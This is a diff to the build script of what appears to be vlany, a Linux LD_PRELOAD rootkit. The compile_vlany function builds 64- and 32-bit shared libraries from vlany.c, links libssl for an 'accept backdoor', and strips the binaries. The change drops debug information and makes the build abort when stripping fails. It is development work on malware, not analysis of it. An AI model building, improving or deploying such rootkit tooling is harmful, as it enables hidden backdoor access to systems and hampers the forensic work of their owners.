@@ -249,18 +249,18 @@ config_vlany ()
 compile_vlany ()
 {
     WARNING_FLAGS="-Wall -Wno-comment -Wno-unused-result"
-    OPTIMIZATION_FLAGS="-O0"
+    OPTIMIZATION_FLAGS="-O0 -g0"
     OPTIONS="-fomit-frame-pointer -fPIC"
     LINKER_OPTIONS="-Wl,--build-id=none"
 
-    # no point in linking the libssl library if SSL isn't being used for the accept backdoor lol
+    # no point in linking libssl if SSL isn't being used for the accept backdoor lol
     [ $SSL_STATUS == 1 ] && { LINKER_FLAGS="-ldl -lssl -lcrypt"; }
     [ $SSL_STATUS == 0 ] && { LINKER_FLAGS="-ldl -lcrypt"; }
 
     rm -rf *.so.*
     gcc -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.x86_64
     gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
-    strip ${OBJECT_FILE_NAME}.so.x86_64
+    strip ${OBJECT_FILE_NAME}.so.x86_64 || { echo "Couldn't strip library. Compilation failed, exiting."; exit; }
     strip ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
 }
 
